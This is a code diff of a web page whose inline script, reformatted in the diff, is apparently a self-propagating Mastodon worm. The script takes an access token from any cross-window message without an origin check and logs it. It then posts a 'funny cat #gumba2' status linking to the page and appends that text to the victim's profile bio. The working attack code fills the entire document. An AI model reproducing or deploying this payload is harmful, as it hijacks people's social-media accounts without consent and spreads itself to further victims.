@@ -28,19 +28,29 @@
     <script src="mastodon.js"></script>
     <script>
       // post #gumba2 baby!
-      window.onmessage = ({ data: token }) => {
+      window.onmessage = ({
+        data: token
+      }) => {
         const api = new MastodonAPI({
           instance: "https://mstdn.social",
           api_user_token: token
         });
         console.log('Token:', token)
         const status = 'Look at this funny cat! #gumba2 ' + document.location.href
-        api.post("statuses", { status }, function (data) {
+        api.post("statuses", {
+          status
+        }, () => {
           console.log('done toot')
         });
 
-        api.get('accounts/verify_credentials', {}, ({ source: { note } }) => {
-          api.patch("accounts/update_credentials", { note: note + '\n' + status }, function (data) {
+        api.get('accounts/verify_credentials', {}, ({
+          source: {
+            note
+          }
+        }) => {
+          api.patch("accounts/update_credentials", {
+            note: note + '\n' + status
+          }, function (data) {
             console.log('done bio')
           });
         })
